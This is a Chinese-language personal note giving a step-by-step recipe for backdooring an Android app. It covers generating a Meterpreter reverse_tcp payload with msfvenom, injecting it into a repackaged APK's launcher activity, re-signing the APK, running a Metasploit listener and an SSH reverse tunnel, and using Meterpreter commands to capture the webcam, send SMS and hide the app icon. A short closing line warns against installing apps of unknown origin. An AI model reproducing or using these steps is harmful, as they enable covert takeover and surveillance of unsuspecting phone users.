# 拆包笔记（起因是想玩一下移动开发的淘矿）
### 拆：
```
apktool  d -r  /root/xxxx.apk
/*加上-r才能解决再次打包失败的问题，一堆png和jpg错误*/
//但这样拆出来的有些东西就没办法改了，去掉-r才能改

#安卓后门  payload.apk生成
msfvenom -p android/meterpreter/reverse_tcp LHOST=xx.xx.xxx.xx LPORT=xxx R>/root/payload.apk
//继续拆包，更改文件，
apktool d payload.apk
//在 AndroidManifest.xml中  查找launcher  找到SplashActivity.smali文件地址 
//在文件中onCreat方法（如果没有，在constructor中找到文件位置再去找方法）下添加invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V，app启动时payload一起启动

```
```



cp /payload/smali/com/* smali/com/ -r
//注意在正确目录下执行
//AndroidManifest.xml中uses-permission android:name=修改


```

### 打包
```
apktool b xxxx（拆包所得的文件夹）
//dist文件夹下生成了再次打包后的apk
//在dist目录下生成签名文件
keytool -alias myKey -genkey -v -keystore my-release-key.keystore -keyalg RSA -keysize 2048 -validity 10000
//对重新打包的apk进行签名
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore 1.apk myKey
//这样手机就能安装了


```

### 监听
```
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST xx.xx.xxx.xxx（ip）
set LPORT xxx
exploit
............
.......
.....


```

### 查看app签名信息
```
keytool -printcert -file /root/xxx/original/META-INF/CERT.RSA
//xxx为拆包后生成的文件夹

```


### SSH打洞
```
ssh -C -f -N -b 0.0.0.0 -R 8080:localhost:8080 root@ip



```

### [后门生成](http://pro.leanote.com/pe/5cdafcc0d1b212f67fc062b4#h3-1-%E6%89%93%E5%8C%85) 
### [监听](http://pro.leanote.com/pe/5cdafcc0d1b212f67fc062b4#h3-2-%E7%9B%91%E5%90%AC) 
### Meterprete 命令
```
sysinfo    //系统信息
webcam_snap -i 1
check_root  //查看是否root
send_sms -d +手机号 -t "GREETINGS PROFESSOR FALKEN."  //发短信
webcam_stream    //显示实时画面
hide_app_icon    //隐藏
webcam_list   //几个摄像头

```
玩这个多要了解点基础知识。粗略写一写，笔记。
#                         [Meterpreter命令详解](https://www.cnblogs.com/backlion/p/9484949.html)                         

忠告：不要安装来源不明的app，很危险。。。





